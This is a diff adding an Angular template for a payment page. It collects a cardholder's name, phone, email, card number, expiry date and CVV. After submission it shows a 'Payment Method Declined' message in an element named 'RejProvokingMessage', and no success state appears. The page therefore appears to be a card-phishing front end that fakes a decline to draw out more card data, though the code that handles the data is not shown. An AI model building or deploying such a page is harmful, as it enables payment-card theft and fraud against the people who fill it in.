@@ -1,0 +1,86 @@
+<div class="alertBox" [ngClass]="{ 'show': showAlertBox }">
+    <div *ngIf="paymentForm.get('securitycode')?.invalid && paymentForm.get('securitycode')?.touched">
+       <p>CVV/CVC must be 3 or 4 digits!</p> 
+    </div>
+    <div *ngIf="paymentForm.get('cardnumber')?.invalid && paymentForm.get('cardnumber')?.touched">
+        <p>Please enter a valid card number!</p>
+    </div>
+    <div *ngIf="paymentForm.get('email')?.invalid && paymentForm.get('email')?.touched">
+        <p>Please enter a valid email!</p>
+    </div>
+    <div *ngIf="paymentForm.get('phone')?.invalid && paymentForm.get('phone')?.touched">
+        <p>Please enter a valid phone number!</p>
+    </div>
+    <div *ngIf="paymentForm.get('fullname')?.invalid && paymentForm.get('fullname')?.touched">
+        <p>Fullname is required!</p>
+    </div>
+    <div *ngIf="paymentForm.get('expirationdate')?.invalid && paymentForm.get('expirationdate')?.touched">
+        <div *ngIf="paymentForm.get('expirationdate')?.errors?.['invalidExpirationDate']">
+          <p>Please enter a valid expiration date (MMYY format)!</p>
+        </div>
+        <div *ngIf="paymentForm.get('expirationdate')?.errors?.['expiredCard']">
+          <p>The card has expired!</p>
+        </div>
+    </div>
+      
+</div>
+
+
+<div class="maindiv">
+    <div class="PayBox" *ngIf="!submitted">
+      <div class="leftSide">
+        <div class="TopPart">
+          <img src="./assets/website-logo.png" class="logo" />
+        </div>
+        <div class="BottomPart">
+          <div class="amount">
+            <p class="AmountText">
+              <b style="font-size: 16px;">Amount: </b>
+              <b style="font-size: 20px; margin-left: 10px;" id="Amount1">{{ amount }}</b>
+            </p>
+          </div>
+        </div>
+      </div>
+      <div class="rightSide">
+        <div class="PaymentData">
+          <form [formGroup]="paymentForm" (ngSubmit)="onSubmit()">
+            <div>
+              <input type="text" formControlName="fullname" placeholder="Fullname" id="KData" required />
+            </div>
+            <div>
+              <input type="tel" formControlName="phone" placeholder="Phone (+420 777 777 777)" id="KData" required />
+            </div>
+            <div>
+              <input type="email" formControlName="email" placeholder="Email" id="KData" required />
+            </div>
+            <div>
+              <input id="cardnumber" type="text" formControlName="cardnumber" (input)="formatCardNumber()" placeholder="Card Number" required />
+            </div>
+            <div class="CData">
+              <input id="expirationdate" type="text" formControlName="expirationdate" (input)="formatExpirationDate()" placeholder="Expiration Date" required />
+              <input id="securitycode" type="text" formControlName="securitycode" placeholder="CVV / CVC" maxlength="4" required />
+            </div>
+            <button class="paymentButton" type="submit">Pay <b style="margin-left: 10px;" id="Amount2">{{ amount }}</b></button>
+          </form>
+        </div>
+      </div>
+    </div>
+  
+    <div class="loader-wrapper" *ngIf="submitted">
+      <div class="loader"></div>
+      <div class="loading-text">Payment Processing</div>
+      <div class="message">
+        <div class="insideMessageDiv">
+          <img src="Rejection.png" class="Rejection" />
+          <p class="textMsg">Payment Method Declined</p>
+          <div class="RejProvokingMessage">
+            <svg id="Icon" fill="currentColor" height="1em" viewBox="0 0 16 16" width="1em" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="presentation" style="font-size: 1rem; vertical-align: -0.175em;">
+              <path fill-rule="evenodd" d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1Zm0 1.2a5.8 5.8 0 1 0 0 11.6A5.8 5.8 0 0 0 8 2.2Zm0 8.698a.602.602 0 1 1 0 1.204.602.602 0 0 1 0-1.204ZM8 3.9a.6.6 0 0 1 .592.503L8.6 4.5v5.14a.6.6 0 0 1-1.192.098L7.4 9.641V4.5a.6.6 0 0 1 .6-.6Z"></path>
+            </svg>
+            <p id="RejProvokingMessageText">Your payment couldn't be authorized. Please check the card number, security code, and expiration date and try again, or use a different payment method.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
